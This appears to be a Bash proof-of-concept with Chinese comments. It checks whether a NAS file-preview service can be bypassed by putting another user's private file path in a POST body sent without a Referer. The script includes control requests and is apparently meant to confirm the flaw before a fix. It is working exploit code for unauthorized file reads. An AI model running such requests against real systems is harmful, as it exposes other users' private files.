#!/bin/bash
# POST body 路径绕过 —— curl 版真机验证（不依赖 python）
# =====================================================
#
# 用法：把下面 4 个变量改成你自己的，然后**整段**粘贴到 NAS 的终端里执行。
#
#   注意 ① 路径要填「当前登录用户读不到」的文件（如另一个用户的私有文件）；
#   注意 ② 需要一个「读得到」的路径做对照；
#   注意 ③ Cookie 从浏览器 F12 → Network → 任意一个请求 → 复制 Cookie 头。
#
# 输出怎么读：
#   [1] GET  对照 —— 若 403，说明闸门生效、Cookie 有效（前提成立）
#   [2] POST 无 Referer —— **若 200，绕过成立**（这就是要验证的）
#   [3] POST 带合法 Referer —— 看它拦不拦，判断 fail-closed 会不会误伤正常流程
#
# ⚠️ 只在你自己设备上、对你自己的文件做验证。

set -u

# ======== 改这 4 个 ========
BASE="https://你的域名:端口"
COOKIE="trim_session=把这里换成你的完整Cookie"
PRIVATE="/vol2/1000/别人的私有文件.docx"      # 当前用户**读不到**的
PUBLIC="/vol1/1001/我能读的文件.docx"          # 当前用户**读得到**的（对照）
# ==========================

P="/app/basemetas-fileview"
JQ_BIN=""
command -v jq >/dev/null 2>&1 && JQ_BIN="jq"

echo "========================================================================"
echo " POST body 路径绕过 —— curl 验证"
echo "========================================================================"
echo "BASE    = $BASE"
echo "PRIVATE = $PRIVATE"
echo "PUBLIC  = $PUBLIC"
echo

echo "[1] 对照：GET /preview/view?path=<私有>  （期望 403）"
code=$(curl -s -o /dev/null -w '%{http_code}' -G \
  --data-urlencode "path=$PRIVATE" \
  -H "Cookie: $COOKIE" \
  "$BASE$P/preview/view")
echo "    → HTTP $code  $([ "$code" = "403" ] && echo '✅ 闸门拦截（前提成立）' || echo "⚠️  非 403 —— Cookie 可能无效/闸门未 enforce/路径填错")"
echo

echo "[2] ★ 攻击：POST /preview/api/localFile  body 带私有路径，**无 Referer**"
BODY=$(printf '{"srcRelativePath":"%s","previewType":"SERVER_FILE","fileName":"x.docx"}' "$PRIVATE")
code=$(curl -s -o /tmp/fv_bypass_resp.txt -w '%{http_code}' \
  -X POST \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  -H "Referer;" \
  --data "$BODY" \
  "$BASE$P/preview/api/localFile")
echo "    → HTTP $code"
if [ "$code" = "200" ]; then
  echo "    ⚠️⚠️  **200 放行 —— 绕过成立**"
  echo "    响应前 300 字："
  head -c 300 /tmp/fv_bypass_resp.txt; echo
elif [ "$code" = "403" ]; then
  echo "    ✅ 403 —— 闸门拦下了（未绕过）"
else
  echo "    ⚠️  其它状态码 $code："
  head -c 300 /tmp/fv_bypass_resp.txt; echo
fi
echo

echo "[3] 对照：POST 带**合法** Referer（模拟正常浏览器流程）"
code=$(curl -s -o /dev/null -w '%{http_code}' \
  -X POST \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  -H "Referer: $BASE$P/preview/view?path=$PUBLIC" \
  --data "$BODY" \
  "$BASE$P/preview/api/localFile")
echo "    → HTTP $code"
echo "    （若这里被 403：说明修补成 fail-closed 后，正常流程可能被误伤，需再评估）"
echo

echo "========================================================================"
echo " 补充：确认闸门真的在工作"
echo "  docker logs --tail 30 basemetas-fileview-acl"
echo "  应能看到上面几次请求的判定行（放行/拒绝 + 原因）"
echo "========================================================================"
